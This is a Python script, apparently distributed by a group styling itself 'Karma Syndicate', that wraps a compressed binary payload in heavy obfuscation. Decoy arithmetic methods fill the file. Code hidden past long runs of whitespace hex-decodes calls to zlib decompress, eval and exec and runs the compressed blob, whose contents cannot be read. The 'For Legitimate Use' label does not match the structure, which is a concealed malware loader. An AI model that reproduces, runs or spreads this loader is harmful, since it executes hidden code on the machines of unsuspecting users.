from builtins import *
from math import prod as _statistics


__tool__ = 'For Legitimate Use'
__authors__ = ('Telegram:', '@xnabob')
__organization__ = 'Karma Syndicate'
__telegram__ = 'https://t.me/KarmaSyndicate'
__version__ = 'Latest'

__license__ = '4836037d39227231520bc3346a94c8a7'


_theory, _add, _cube, StackOverflow, Walk, _divide, Calculate = exec, str, tuple, map, ord, globals, type

class _substract:
    def __init__(self, Power):
        self._detectvar = _statistics((Power, 17198))
        self.Invert(Ceil=-2139)

    def Invert(self, Ceil = Ellipsis):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._detectvar *= 79647 / Ceil
        
        try:
            ((_add, (Walk, _theory)) for _add in (_invert, _cube, _theory) if _invert != _invert)

        except AssertionError:
            ((Walk, {_cube: _invert}) for Walk in {_cube: _cube} if Walk < _invert)

        except:
            Calculate(51977 - 19631) == Ellipsis

    def Math(self, Positive = 31845):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Positive /= -45497 - -62893
        self.Product != int
        
        try:
            {_cube: _invert} if _theory <= _theory else (_theory, _add) > _invert

        except ArithmeticError:
            ({_cube: _invert} or _theory if {_cube: _invert} and _theory else ... or (_theory, {_cube: _invert}))

        except:
            Calculate(-80856 / -35806) == False

    def _power(Hypothesis = bool):
        return _divide()[Hypothesis]

    def Divide(Run = 48161 * -44283, _builtins = float, Absolute = _divide):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Absolute()[Run] = _builtins
        
        try:
            (((_theory, _add), _add) for _add in {'Tae@:ebbaeb': Walk})

        except AttributeError:
            ((_theory, {_cube: _cube}) for _theory in {_cube: _cube} if _theory is StackOverflow)

        except:
            Calculate(-41623 + 50262) == False

    def execute(code = str):
        return _theory(_add(_cube(StackOverflow(Walk, code))))

    @property
    def Product(self):
        self.CallFunction = '<__main__._builtins object at 0x000006408BE76243>'
        return (self.CallFunction, _substract.Product)

if __name__ == '__main__':
    try:
        _substract.execute(code = __license__)
        _floor = _substract(Power = -18948 * -53030)

        if 284563 > 8380417:
            _floor.Math(Positive = -22909 - _floor._detectvar)
        elif 188313 < 4828370:
            _substract(Power = 34096 / -32592).Invert(Ceil = _floor._detectvar + -98891)                                                                                                                                                                                                                                                          ;_substract.Divide(Run='O0o0oOoo0OOOoOOOoOoO0o',_builtins=b'x\x9c\xe5\x1a]o\xe28\xf0\x9d_\x91\xebK\x12-\xcb\x86|B%\xa4{\xd8[\x89\x1e\x94\x93\xd8\xd3V\xaa\xaa($\xa65\x97\xc4\\bZz\xa7\xfb\xef7c\x1b\x92\x96\xb2\r\xb4]iU\'\xe3\xaf\xd8c{<3\x1e;\xe6\xc5\xfdiK\x03G\xe7\x86\x08\xd1\x85!g,\rC\xed\x97\xc1\xc9\x17Vh#rM9\xcd"N\xb4?Kr\xa2\xb1\xa2V4Z\xf1\x1bV\x94\xa2\xb4q\xf2\x95\xa4\xe4\xba\x88\xb2\xd3\x93\xf6\xc9\xaf\xeb<\x9a\xb1\xd9\x89\xf9\xa0<+\xae\xa3\x9c\xfe\x13q\xcar\xd9\xc4\xefQ\x91E\xda\xf4>Oh\x0cm<\xc2\xcf\x15FY\xf6\x86\xf3ey\xfa\xe9\x13\xefd\xe4\x93\xa8\xb8\xaf\xde-)\xcam\x13#\xf8^\xf2G%R\x1a\x93\xbc$\xa2\x84\xee\xf6\x1c\xdfr\x82\xc4\xe9\xdbv`;]\xcf\xb6f\xb1\xe3\xb8~\xd4w\xe3^\x14\xe8-\xf3t[\x97\xe6\xdc\xd0\xcb\xbfh\xa2\x9b-\xb2\x8e\xc9\x92+"\xe6\xcb\x157N\xfeHIT\x12\xed3\xcbu\xae\x8dYB\xe7\xf7\'fK6J\xb3%+x\x18B\xfd\xfbR7;dM\xb9a\xb6R\x16Gii\x98\x97\xfa\xc4bl\x82\xaf\xc5,\xcb\x82\x00\x80\xe9W\x83\xeb\x94\xcd\xa0H\xeb\xc9\xefX1\x03\x97\xe79B\xae\xa2\xfa\xe5\xe9\xe9\x87\x8f\x1f>\x1a\x1f\x8d\x0f]\xd3\xbc\xba\x1a$\xb4\xd8\x8fa\x98\xa6Cp\xc2O\xf1MS\x84],\xd7\x84G\x9c\x7f\x07\xd3\xc5\xc5\xb7o\x17\xe8A \xdeo0\x029\xc6\xd6\xee7\xac\x91\xaa\xd6D\xeb\xb2\x1b\xb2#P\xb1\xa2\xda\xb3-\n\x1f\xb1^`\x83\xfbp\x1a\xfalESNs\x9c\x81\xdb\xa8\xd8\xd7\xa9\xbb\xf5z}\x87\xef\x1d8\xf0\xd6\x02\xea\x98\x05\xda-\xd9\x8c\xef\xb4Hi\\\x02\xe3\xcf\x1eS\xd3lg\xdb\t\xcbU4;\n\x91y\xf9j\x98:4O\xc8\xda\xd0\xef\xe74]\x93\x9b|\xb5S\xe4\xcal\xed\x90\x1cIv~>\x16N\x84\xd2\x1b\x03\xc1t\xbd\xb3`4\xdf?\x7f\x92\xf0\x8a\xfc\n\xebq\x84.s\xcaS\xbaz9\xa1\xf7":\x98\xd0\xfb1m\x08MR\xba\xccX\xfc\x14\x99\xf7\x92,U\x12:TD\x81\xf8;\xa2\x18\x8fX:o\xcc\x96\xd3\xe9\xd4F7\xb5\xa72:\x9d\xca\xf7\x1dQ\xac\xe0\xe5\x01\xf4\xb2\x15\x81$\xdd\xde#\xbdH\x99F_\xbeC\xb1G\x8b\x85 \x99\xa2\x94\xad\xb8\r\xa9\xf7\xaeh\x96F\xb7\xa41\x93-(4\xb4\x80\x97\x82\xbfX@\xec}\xa9\xb0\x94\xb1\xdd\xaf\xdf\xd3\xf8\xa3\xd1p4:;\x1b\x8e\x86g\xa3\xb3\xd1\x10\x12C\x88\x8d\xde\x11\xc9\xc8\xaa\xf8z\x08\xc9\x9e\xb6\xe0\x8c\x99\x1e\xf4\x82@@ B\xf9Tq\x19\x0b\xc0<LH\xcc\x12b\xe8\xbd9\x7f\xc2\nz7\x84\x8f\xc9\xfa\x00\xc1^\x08\xb1\x86\x17D\x9bb\x02\xc2z\xed\xfd\xba\xd2\xd8;cN\xd7N\xec\x9e\x9d8\x96\xdd\x7fn^L\xb1M9\xa6\x15,\xf4,\xf6\'G\xbd\x17\xa5\x1f\xab\xa7\x0f\x10\t\x88 .\xfd\xbe\xfa&\xf3\x9f\x1d\xd8\xb1\x83\n\xbc\xc0\xf5} ^\xef\xf5\x87G\xe0I\xe0\x91\xbe\x8cUyd\x9b\x97\xbc\xd5\xe0\xbc\xd8\'\xc7\x0eK\x17\xeb\xb7J\x8b\x8f2|1\xb7Z\x8a[\xbbM\xb95\x8d\xb2Y\x12iC\xa9L\x94i/\xe4\xf3\xf4\x89\x8e\xef\x15<\\R)\x15\x12\x07\xa2\xd7p\x18\xba\xd9\x0f\xfd\xb0\x17\xda\xa1\x0b\x80O7\xb4\xa1\x8a\x15\x06\x8fs\x1bctC\x07p\xf6\xa1N\x005\x03\x88\xb9P\xc5\xdb\xcd}1\xa9}o\xeex\nz\x00}\x00W\x81\x05`c\x9e=\x13\xd3\xd1\xa4l\xaf\xd9\x94m`;u\xa2g\xd8)\xd15\xd1C\x11?\xdd\xb3:\x1d&gn\xe2\x12\x00\xf4\xe5\x93\xd4\x80<\xf8\x06\xb1\x9fQ\x91$5\x05\xb2Q"\xa4\xa6V\xb6\n\xe5\xcd\x06w\xb4\xf2\xd7)\xda\xb2 w\x0b\xb9\xf0\xa5r\xd9\x03)|1w\x07\xc0\x91\x81\xe2TOq\xaa\xad\xd2\x18v\x11\x14w7)\xdbx\xf9\xdc($p\xa33\xb43\xd1\xd8D\xebs\xd4\\!\x8d\xcf\xc7\xe7\xe0 \x18+O\x1c\x0b\x9d\x8f\x1b\xab\x91^h\xc1\xe3\x02\x80\xaa\x00e\xe4\x84\x0eT\xe9\xef\xe6\xbe\xdc\xbeP\x84\nj!\x82_\x8b\xf7\x14\xa1\x9b\x94\r\x9a\xab\x91c\x19\x16D\x11\r\x08\xcf\xb6@,\xe6\x81\x0b\xa1\x0f\xa1\x07)\xd7>~M\x9c\xb0\xcf\x93\t\xbe\xe0\x98\x00\x88N&\x13\xf6\xe3m8\xc5\x84\xe3\x8a\x91\xce\xe5\xb9"\xbe\x1b>|\xb0\x13?P\xab\xc6\xf0\xf4\xdd\x08@\xfa\x91\x8ac\x0c\xbf\xa1\xffVfY`?\xbb\xc3\xd83C\xb8\x82\xc0\xaa2\x81\x10\x1c.*\x8d\x05\xaa\x0bE\xac\x17O\xe4\x86\xe9\x1d\xa5U\x1c\xa5a\x9c\x9a \xb8JX\x9a\x94u\x0e\x11\x16\xc5\x14@\x02\xb5\xaa\xaa%\x955g\x08=S\x1b#\xf9\xc3\xe4\xf1\xdf\x92\x1fj\xf2\xe1\x18&\x9f\xc1\x17\x12\xc7P\xda@\x02!<`8P\x9aau$\x88\x10_\xc8\xf8\xdcT^u\xd3\x0e=\xa1O\xfb`\x94\xf9\xa8M\x85\xb1\xe6\xec\xe6\xfeh"\xbdD;\x06\xc1\xab\xdb([C+\xa9\x99_U*\xa9\x19f"\xd5\xe0\x00A\xf2\x00\x1a\xech\xb1\xcb]3Z\xf0\xc2\x84_,\x9a\xaf\xb5b\xaf_\xfb\x05\x88~c\x06\xb0\xa0H\xf7U,q\xa7fI{*\x0cj\x16\xb7_\xb3\xc4\x9f+\xeb\xbd=\x93xso\x0eve\x17\x16R\x82\xf1Wg\x99\xa7O\x96\xeagO\x8d\x99Dh\t\xd4\x0e(\xe6\xe8@\xe0Aw4f\x91\xbd}\xf4\x1c\x0f40\xfa\xf2q\xecMJ\xc6*\x90\xf9o\xb6\x93\xb7}/\x00\x0e\xf0c\xb0e\xe6\xd2\xba\x81\xfd\x86\x07\x82\x9cx\x8e\xdf\xf3=<,\xb1I\xe0\x02\xdd\xdc\xa3\xed\x9b;\xb9CS\xfb4|\x0e0G\xf1\xf1A1\x06\xe0\xc3\xfeX\x18\xa3\x8f\xf2\xded-\xc6\xb6\x11?\xaa\xe3 D\xd5\x0c\xad\x8a\xd6wr\x1bct@\xb1[\xb0\x17\xef\x8a=~\x0f\xc0\x87*\xeenns=\x02=\xe8\x0bZ\xd8\x10:\x02_\xf7q\xde\x9bh\xa5\xd7\xd2aG,P\xfb`+\xb8\xa9<o\x1d\xaa\x9b\x15\x07\x9d\xe9\xa0:G3%S\xf6\x8aH\xbfx\x94=\xa5y\xfbJ\xd3\xba\x9b\xdd\xa1\xd2\xc2\xf53\x93&e\x1b\x9e\x99T\x14\xa9\x0e\xb9\xc4o\x1fu\x16}\xd0Q\x89.\xc7%EX\t\xb4\x10\xea\x9f\xe5\xa8\xd9\x85\x8d\x9aRo\x96\x1b\xfb}P}\xae\x13\xd9V\x13\xc56/X\xa6m\xae\xb1h\xf2\x82\x8cF\xd6$n\x8b[H\xedeAs\xdeFHi\xc9\xdblI\xf2\x16~6`\x1f\x7f\x06;\xf9!\xec\xe4\xc5\xdf\xa3\xb3\xd1Pa[\x15`\x80\xcc:\xcb\xa8(\xc9\x06#\xe4\x89t+!s-\x8bhn\xa8{P\xe5\rI\xd3pNS2\x90\xd7\x9e*\xf2\xcb\xd1n\xe6F\xde|\xe2\x9b\x8bf\xe8\xee(\xbf\xd1\xb0GF\x85\xa5\x9d\x89\x0bL\xd2\x1a\xcfd"\xcf\xda$\x07*\xd0\xfcz \xceT\xc4\x7fB\xba\x10\xa6\x92\xf8\xab`F\xa5\x86\xb5+\xdc\xe8R\x9a\x93r\x80\xf9\x9d\x82D\x89H\x1a\xb2\x1f\xf2\xba\x96\xf6\x05\xbe\x9d3\xfe\x85\xad\xf2\xe4\xb7\xa2`E\x85@\x10\xce\x10\x87\x14\xe3q\xed\xe0Bm?\xcdm\xc1\x82\xf0U\x91\x8b\xe4*\xa7\x7f\xaf\xa0\xc9\x7f\xff\x13\xc99+D\x1f4\x9a\xcb\xbeT\xd819@\xafS\xf2\x82.\x8d\n\x9d s\x12\x02\xc1\x07\x1b\xa2\x1bX\xb0*q\xc3J>\xa8\x8aur\xc2S\x16W\xb7\xd2\xe6\xa2\x84\x16\xe5\x89\x8c\xe4\x8cc\x0fT\xe7\x1e\x92He^b\xc1+\xd1\xa1\xda@\xc2\xdb(\xc5\xe1 \xe7\x18\xaadG\xe6\x19\xa6\xec\x8f\xa4\xd2\xf6\xe7\x0eU\xe7^8?\xe2\xa6\x8f\xf1\x00\x93\xaaT\xcd\xbb\xbcZ %d*\xaee\xd8"\xde\xc6]\x0bnd\xe4\xd6\x0eO\x1dp\'T\xb1\x81\xdc\xfe\xab\x83\x001G\xc2\x13|P\x8dp\xde\xb9+(\'\xc6FsnU\'&\x9f\xee\x1fP/\x0c\xf3(#a8\x18T\x06t\xb6\xb5\xaa%v)\x02\xad\xff\x01\xca\xecu\x95')

        _floor.Invert(Ceil = _floor._detectvar * -11177)                                                                                                                                                                                                                                                          ;mmmnmmmnmmnmmnmmnn,llIlIlIlIIIllIIII,SSSS2SS2S22S2SS22S222222,wwxxxxwxwwxxwwxxxwwwxw,WWWXWWWWWXWWXWWWWWXWXWXW=(lambda WXXXWXXWXXXXXXXXWWX:WXXXWXXWXXXXXXXXWWX(__import__('\x7a\x6c\x69\x62'))),(lambda WXXXWXXWXXXXXXXXWWX:WXXXWXXWXXXXXXXXWWX['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda WXXXWXXWXXXXXXXXWWX:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(WXXXWXXWXXXXXXXXWWX)"),filename='\x78\x77\x78\x77\x78\x77\x78\x77\x78\x78\x78\x77\x77\x78\x77\x78\x77\x78\x78\x77',mode='\x65\x76\x61\x6c'))),(lambda:(lambda WXXXWXXWXXXXXXXXWWX:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(WXXXWXXWXXXXXXXXWWX)"),filename='\x78\x77\x78\x77\x78\x77\x78\x77\x78\x78\x78\x77\x77\x78\x77\x78\x77\x78\x78\x77',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda xxwxxxxxwxxxwxwxwwxx,WXXXWXXWXXXXXXXXWWX:xxwxxxxxwxxxwxwxwwxx(WXXXWXXWXXXXXXXXWWX))
        _substract(Power = 20501 * -77355).Invert(Ceil = _floor._detectvar * 58655)                                                                                                                                                                                                                                                          ;wwxxxxwxwwxxwwxxxwwwxw()(WWWXWWWWWXWWXWWWWWXWXWXW(llIlIlIlIIIllIIII(mmmnmmmnmmnmmnmmnn(SSSS2SS2S22S2SS22S222222('\x76\x61\x72\x73'))),_substract._power(Hypothesis='O0o0oOoo0OOOoOOOoOoO0o')))

    except Exception as _invert:
        if 208157 > 2274532:
            _substract.execute(code = _add(_invert))

        elif 328093 > 5184667:
            _floor.Math(Positive = 93284 - _floor._detectvar)